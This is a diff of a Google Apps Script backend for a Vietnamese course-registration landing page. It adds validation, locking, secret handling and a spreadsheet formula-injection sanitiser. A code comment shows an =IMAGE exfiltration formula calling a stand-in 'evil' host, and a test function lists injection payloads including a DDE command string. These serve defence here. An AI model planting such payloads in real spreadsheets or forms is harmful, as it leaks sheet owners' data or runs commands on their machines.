@@ -8,8 +8,10 @@
  * === Deploy (cập nhật app cũ) ===
  * 1. Mở Google Sheet đăng ký → Extensions → Apps Script
  * 2. Dán toàn bộ file này (thay code cũ), Save
- * 3. Deploy → Manage deployments → Edit → Version: New version → Deploy
- * 4. Giữ quyền "Anyone". URL Web App không đổi → không cần sửa app.js
+ * 3. Cấu hình Telegram (nếu dùng): Project Settings → Script Properties → thêm
+ *    TELEGRAM_BOT_TOKEN và TELEGRAM_CHAT_ID. KHÔNG ghi token vào file này — repo là public.
+ * 4. Deploy → Manage deployments → Edit → Version: New version → Deploy
+ * 5. Giữ quyền "Anyone". URL Web App không đổi → không cần sửa app.js
  *
  * Cả 2 sheet đều ghi thêm 6 cột thiết bị ở cuối (loại thiết bị mobile/tablet/desktop,
  * hệ điều hành, trình duyệt, màn hình, viewport, hướng).
@@ -24,14 +26,23 @@
  */
 
 // =========================================================================
-// CẤU HÌNH TELEGRAM BOT (Thay thế bằng thông tin thật của bạn khi sẵn sàng)
+// CẤU HÌNH
 // =========================================================================
-const TELEGRAM_BOT_TOKEN = "";
-const TELEGRAM_CHAT_ID = "";
 
 // Tên sheet ghi lượt truy cập landing (khách vào mà chưa đăng ký).
-// Sheet đăng ký vẫn dùng getActiveSheet() như code cũ để không phá cấu hình hiện tại.
 const VISITS_SHEET_NAME = "Visits";
+
+// Tên sheet ghi đăng ký. Không tìm thấy sheet đúng tên thì lùi về sheet đầu tiên
+// (xem getRegistrationsSheet_) để giữ nguyên đích ghi của các deployment cũ.
+const REGISTRATIONS_SHEET_NAME = "Registrations";
+
+// Trần độ dài mỗi ô. Sheets cho phép tới 50.000 ký tự/ô nên nếu không chặn,
+// một POST duy nhất có thể làm phình bảng tính.
+const CELL_MAX_LENGTH = 500;
+const LONG_TEXT_MAX_LENGTH = 2000;
+
+// Thời gian chờ tối đa khi giành khoá ghi giữa các request đồng thời.
+const LOCK_TIMEOUT_MS = 20000;
 
 // Cột thiết bị dùng chung cho cả 2 sheet (luôn nằm ở cuối để không phá thứ tự cột cũ).
 const DEVICE_HEADERS = [
@@ -70,59 +81,178 @@ const SHEET_HEADERS = [
   "Vị trí đăng ký"
 ].concat(DEVICE_HEADERS);
 
+// Soi gương ràng buộc của isValidVietnamesePhone() trong app.js.
+const VN_PHONE_PATTERN = /^0[35789]\d{8}$/;
+const FULL_NAME_MAX_LENGTH = 100;
+const AGE_MIN = 10;
+const AGE_MAX = 100;
+
 function doPost(e) {
   try {
     if (!e || !e.postData || !e.postData.contents) {
       return jsonResponse_({ status: "error", message: "Thiếu dữ liệu POST." });
     }
 
-    const data = JSON.parse(e.postData.contents);
+    let data;
+    try {
+      data = JSON.parse(e.postData.contents);
+    } catch (parseError) {
+      console.warn("Payload không phải JSON hợp lệ: " + parseError);
+      return jsonResponse_({ status: "error", message: "Dữ liệu gửi lên không hợp lệ." });
+    }
+
+    if (!data || typeof data !== "object") {
+      return jsonResponse_({ status: "error", message: "Dữ liệu gửi lên không hợp lệ." });
+    }
 
     // -------------------------------------------------------------
     // NHÁNH VISIT: chỉ ghi log truy cập, không gửi Telegram
     // -------------------------------------------------------------
     if (data.eventType === "visit") {
-      appendVisit_(data);
+      withSheetLock_(function () {
+        appendVisit_(data);
+      });
       return jsonResponse_({ status: "success" });
     }
 
     // -------------------------------------------------------------
-    // NHÁNH REGISTRATION (mặc định) — GIỮ NGUYÊN LUỒNG CŨ
+    // NHÁNH REGISTRATION (mặc định)
     // -------------------------------------------------------------
-    const row = normalizeRow_(data);
+    const invalidFields = validateRegistration_(data);
+    if (invalidFields.length > 0) {
+      console.warn("Từ chối đăng ký, trường không hợp lệ: " + invalidFields.join(", "));
+      return jsonResponse_({ status: "error", message: "Dữ liệu đăng ký không hợp lệ." });
+    }
 
     // STEP 1: LUÔN ƯU TIÊN LƯU VÀO GOOGLE SHEETS
-    const sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
-    ensureHeaders_(sheet);
-    sheet.appendRow(row);
+    const row = normalizeRow_(data);
+    withSheetLock_(function () {
+      const sheet = getRegistrationsSheet_();
+      ensureHeaders_(sheet);
+      sheet.appendRow(row);
+    });
 
     // STEP 2: GỬI TELEGRAM AN TOÀN (KHÔNG LÀM HỎNG LUỒNG CHÍNH)
+    // Nằm ngoài khoá ghi: đây là request mạng chậm, giữ khoá sẽ chặn người đăng ký khác.
     try {
-      if (
-        TELEGRAM_BOT_TOKEN &&
-        TELEGRAM_BOT_TOKEN !== "MÃ_BOT_TOKEN_CỦA_BẠN" &&
-        TELEGRAM_CHAT_ID &&
-        TELEGRAM_CHAT_ID !== "MÃ_CHAT_ID_CỦA_NHÓM"
-      ) {
-        sendTelegramNotification(data);
-      } else {
-        console.warn("Chưa cấu hình mã Telegram thật. Hệ thống đã lưu Google Sheet thành công.");
-      }
+      sendTelegramNotificationIfConfigured_(data);
     } catch (telegramError) {
-      console.error("Lỗi gửi Telegram (đã bỏ qua để ưu tiên lưu Sheet): " + telegramError.toString());
+      console.error("Lỗi gửi Telegram (đã bỏ qua để ưu tiên lưu Sheet): " + telegramError);
     }
 
     return jsonResponse_({ status: "success" });
   } catch (error) {
-    return jsonResponse_({ status: "error", message: error.toString() });
+    // Chi tiết lỗi chỉ vào Executions log, không trả về client để tránh lộ cấu trúc script.
+    console.error("doPost thất bại: " + (error && error.stack ? error.stack : error));
+    return jsonResponse_({ status: "error", message: "Không thể xử lý yêu cầu. Vui lòng thử lại sau." });
   }
 }
 
 function doGet() {
-  return jsonResponse_({
-    status: "ok",
-    message: "Muối Đi Học endpoint. POST với eventType visit|registration."
-  });
+  return jsonResponse_({ status: "ok" });
+}
+
+// -------------------------------------------------------------
+// AN TOÀN DỮ LIỆU GHI VÀO SHEET
+// -------------------------------------------------------------
+
+/**
+ * Khử formula injection và giới hạn kích thước trước khi ghi vào Sheet.
+ *
+ * Sheets biên dịch chuỗi mở đầu bằng = + - @ thành công thức y như gõ tay, nên một
+ * cái tên kiểu =IMAGE("https://evil/?d="&A2) sẽ chạy dưới quyền chủ sheet và tuồn dữ
+ * liệu ra ngoài. Dấu nháy đơn ở đầu ép Sheets hiểu đó là text.
+ *
+ * Hàm idempotent: chạy lại trên giá trị đã khử không sinh thêm dấu nháy.
+ */
+function sanitizeCell_(value, maxLength) {
+  if (value === undefined || value === null) {
+    return "";
+  }
+
+  const limit = maxLength || CELL_MAX_LENGTH;
+  let text = String(value).replace(/[\u0000-\u001F\u007F]/g, " ").trim();
+
+  if (text.length > limit) {
+    text = text.slice(0, limit);
+  }
+  if (/^[=+\-@]/.test(text)) {
+    text = "'" + text;
+  }
+  return text;
+}
+
+/** Ràng buộc soi gương validateEnrollmentForm() trong app.js. Trả về danh sách trường sai. */
+function validateRegistration_(data) {
+  const errors = [];
+
+  const fullName = String(data.fullName || "").trim();
+  if (!fullName || fullName.length > FULL_NAME_MAX_LENGTH) {
+    errors.push("fullName");
+  }
+
+  const phone = String(data.phone || "").replace(/[\s.\-]/g, "");
+  if (!VN_PHONE_PATTERN.test(phone)) {
+    errors.push("phone");
+  }
+
+  const age = Number(String(data.age || "").trim());
+  if (!isFinite(age) || age < AGE_MIN || age > AGE_MAX) {
+    errors.push("age");
+  }
+
+  // Chỉ bắt buộc không rỗng, không so với danh sách option cố định: sửa option trong
+  // index.html mà quên sửa script thì đăng ký thật vẫn không bị chặn oan.
+  if (!String(data.youtubeExperience || "").trim()) {
+    errors.push("youtubeExperience");
+  }
+
+  if (!isAcknowledged_(data)) {
+    errors.push("acknowledgement");
+  }
+
+  return errors;
+}
+
+function isAcknowledged_(data) {
+  return data.acknowledgement === true ||
+    data.acknowledgement === "true" ||
+    data.acknowledgement === "Đã hiểu";
+}
+
+/** Chạy action trong khoá ghi để hai request đồng thời không ghi đè nhau. */
+function withSheetLock_(action) {
+  const lock = LockService.getScriptLock();
+  if (!lock.tryLock(LOCK_TIMEOUT_MS)) {
+    throw new Error("Không giành được khoá ghi sau " + LOCK_TIMEOUT_MS + "ms.");
+  }
+  try {
+    return action();
+  } finally {
+    lock.releaseLock();
+  }
+}
+
+/**
+ * Sheet đăng ký, ưu tiên đúng tên cấu hình.
+ *
+ * Code cũ dùng getActiveSheet() — đích ghi phụ thuộc tab mà chủ file mở lần cuối, và
+ * insertSheet() ở nhánh visit cũng đổi sheet active. Khi không có sheet đúng tên thì lùi
+ * về sheet đầu tiên (đúng đích mà getActiveSheet() trả về khi chạy headless) thay vì tạo
+ * sheet mới, để deployment đang chạy không bị tách dữ liệu đăng ký ra hai nơi.
+ */
+function getRegistrationsSheet_() {
+  const ss = SpreadsheetApp.getActiveSpreadsheet();
+  const named = ss.getSheetByName(REGISTRATIONS_SHEET_NAME);
+  if (named) {
+    return named;
+  }
+
+  const sheets = ss.getSheets();
+  if (!sheets || sheets.length === 0) {
+    throw new Error("Spreadsheet không có sheet nào để ghi đăng ký.");
+  }
+  return sheets[0];
 }
 
 // -------------------------------------------------------------
@@ -137,24 +267,24 @@ function appendVisit_(data) {
   ensureSheetHeaders_(sheet, VISITS_HEADERS);
 
   sheet.appendRow([
-    new Date().toLocaleString("vi-VN"),
-    data.visitorId || "",
-    data.campaignCd || "",
-    data.referrer || "",
-    data.path || "",
-    data.landedAt || ""
+    sanitizeCell_(new Date().toLocaleString("vi-VN")),
+    sanitizeCell_(data.visitorId),
+    sanitizeCell_(data.campaignCd),
+    sanitizeCell_(data.referrer, LONG_TEXT_MAX_LENGTH),
+    sanitizeCell_(data.path, LONG_TEXT_MAX_LENGTH),
+    sanitizeCell_(data.landedAt)
   ].concat(deviceColumns_(data)));
 }
 
 /** Giá trị 6 cột thiết bị, đúng thứ tự DEVICE_HEADERS. */
 function deviceColumns_(data) {
   return [
-    data.deviceType || "Không rõ",
-    data.deviceOs || "",
-    data.deviceBrowser || "",
-    data.screenSize || "",
-    data.viewportSize || "",
-    data.orientation || ""
+    sanitizeCell_(data.deviceType) || "Không rõ",
+    sanitizeCell_(data.deviceOs),
+    sanitizeCell_(data.deviceBrowser),
+    sanitizeCell_(data.screenSize),
+    sanitizeCell_(data.viewportSize),
+    sanitizeCell_(data.orientation)
   ];
 }
 
@@ -191,38 +321,72 @@ function ensureSheetHeaders_(sheet, headers) {
 }
 
 function normalizeRow_(data) {
-  const value = function (key, fallback) {
+  const raw = function (key, fallback) {
     if (data[key] === undefined || data[key] === null || data[key] === "") {
       return fallback !== undefined ? fallback : "";
     }
     return data[key];
   };
 
-  const acknowledgement = data.acknowledgement === true || data.acknowledgement === "true" || data.acknowledgement === "Đã hiểu"
-    ? "Đã hiểu"
-    : value("acknowledgement", "");
+  // Không dùng .map(sanitizeCell_): Array.map truyền index vào tham số maxLength,
+  // ô thứ hai của hàng sẽ bị cắt còn 1 ký tự.
+  const text = function (key, fallback) {
+    return sanitizeCell_(raw(key, fallback));
+  };
+
+  const acknowledgement = isAcknowledged_(data) ? "Đã hiểu" : text("acknowledgement");
+  const question = sanitizeCell_(raw("expertQuestion", raw("message", "")), LONG_TEXT_MAX_LENGTH);
+  const note = sanitizeCell_(raw("message", raw("expertQuestion", "")), LONG_TEXT_MAX_LENGTH);
 
   return [
-    value("submittedAt"),
-    value("fullName"),
-    value("age"),
-    value("phone"),
-    value("youtubeExperience"),
-    value("incomePotential"),
-    value("expertQuestion", value("message", "")),
+    text("submittedAt"),
+    text("fullName"),
+    text("age"),
+    text("phone"),
+    text("youtubeExperience"),
+    text("incomePotential"),
+    question,
     acknowledgement,
-    value("email", "Không thu thập"),
-    value("message", value("expertQuestion", "")),
-    value("visitorId"),
-    value("campaignCd"),
-    value("timeSpent"),
-    value("clicks"),
-    value("entryPoint")
+    text("email", "Không thu thập"),
+    note,
+    text("visitorId"),
+    text("campaignCd"),
+    text("timeSpent"),
+    text("clicks"),
+    text("entryPoint")
   ].concat(deviceColumns_(data));
 }
 
-function sendTelegramNotification(data) {
-  const acknowledgement = data.acknowledgement === true || data.acknowledgement === "true" || data.acknowledgement === "Đã hiểu"
+// -------------------------------------------------------------
+// THÔNG BÁO TELEGRAM
+// -------------------------------------------------------------
+
+/**
+ * Token đọc từ Script Properties, không bao giờ nằm trong file này (repo public).
+ * Cấu hình: Apps Script Editor → Project Settings → Script Properties.
+ */
+function telegramConfig_() {
+  const props = PropertiesService.getScriptProperties();
+  return {
+    token: String(props.getProperty("TELEGRAM_BOT_TOKEN") || "").trim(),
+    chatId: String(props.getProperty("TELEGRAM_CHAT_ID") || "").trim()
+  };
+}
+
+function sendTelegramNotificationIfConfigured_(data) {
+  const config = telegramConfig_();
+  if (!config.token || !config.chatId) {
+    console.warn(
+      "Chưa cấu hình Script Property TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID. " +
+      "Hệ thống đã lưu Google Sheet thành công."
+    );
+    return;
+  }
+  sendTelegramNotification(data, config);
+}
+
+function sendTelegramNotification(data, config) {
+  const acknowledgement = isAcknowledged_(data)
     ? "Đã hiểu"
     : escapeMarkdown_(String(data.acknowledgement || ""));
 
@@ -247,9 +411,9 @@ function sendTelegramNotification(data) {
     "▫️ *Mã khách (Visitor ID):* `" + escapeMarkdown_(data.visitorId) + "`\n" +
     "▫️ *Thời gian gửi:* " + escapeMarkdown_(data.submittedAt);
 
-  const url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
+  const url = "https://api.telegram.org/bot" + config.token + "/sendMessage";
   const payload = {
-    chat_id: TELEGRAM_CHAT_ID,
+    chat_id: config.chatId,
     text: message,
     parse_mode: "Markdown"
   };
@@ -286,9 +450,12 @@ function jsonResponse_(obj) {
     .setMimeType(ContentService.MimeType.JSON);
 }
 
+// -------------------------------------------------------------
+// HÀM KIỂM TRA THỦ CÔNG (chạy trong editor, không dùng cho Web App)
+// -------------------------------------------------------------
+
 /**
  * (Tuỳ chọn) Chạy một lần trong editor để kiểm tra quyền / cấu hình.
- * Không dùng cho Web App production.
  */
 function testAppendSampleRow() {
   const sample = {
@@ -315,27 +482,49 @@ function testAppendSampleRow() {
     orientation: "Portrait"
   };
 
-  const sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
-  ensureHeaders_(sheet);
-  sheet.appendRow(normalizeRow_(sample));
+  withSheetLock_(function () {
+    const sheet = getRegistrationsSheet_();
+    ensureHeaders_(sheet);
+    sheet.appendRow(normalizeRow_(sample));
+  });
 }
 
 /**
  * (Tuỳ chọn) Test ghi 1 dòng visit.
  */
 function testAppendSampleVisit() {
-  appendVisit_({
-    eventType: "visit",
-    visitorId: "VISITOR-TEST123",
-    campaignCd: "test",
-    referrer: "https://facebook.com",
-    path: "/?cd=test",
-    landedAt: new Date().toLocaleString("vi-VN"),
-    deviceType: "Tablet",
-    deviceOs: "iPadOS",
-    deviceBrowser: "Safari",
-    screenSize: "1024x1366",
-    viewportSize: "1024x1180",
-    orientation: "Portrait"
+  withSheetLock_(function () {
+    appendVisit_({
+      eventType: "visit",
+      visitorId: "VISITOR-TEST123",
+      campaignCd: "test",
+      referrer: "https://facebook.com",
+      path: "/?cd=test",
+      landedAt: new Date().toLocaleString("vi-VN"),
+      deviceType: "Tablet",
+      deviceOs: "iPadOS",
+      deviceBrowser: "Safari",
+      screenSize: "1024x1366",
+      viewportSize: "1024x1180",
+      orientation: "Portrait"
+    });
+  });
+}
+
+/**
+ * (Tuỳ chọn) Kiểm tra bộ khử formula injection mà không ghi gì vào Sheet.
+ * Mọi dòng log phải bắt đầu bằng dấu nháy đơn.
+ */
+function testFormulaInjectionIsNeutralised() {
+  const payloads = [
+    '=IMAGE("https://example.com/x.png")',
+    '=IMPORTXML("https://example.com","//a")',
+    '+1+1',
+    '-1+1',
+    '@SUM(A1:A9)',
+    "=cmd|'/c calc'!A1"
+  ];
+  payloads.forEach(function (payload) {
+    console.log(payload + "  →  " + sanitizeCell_(payload));
   });
 }
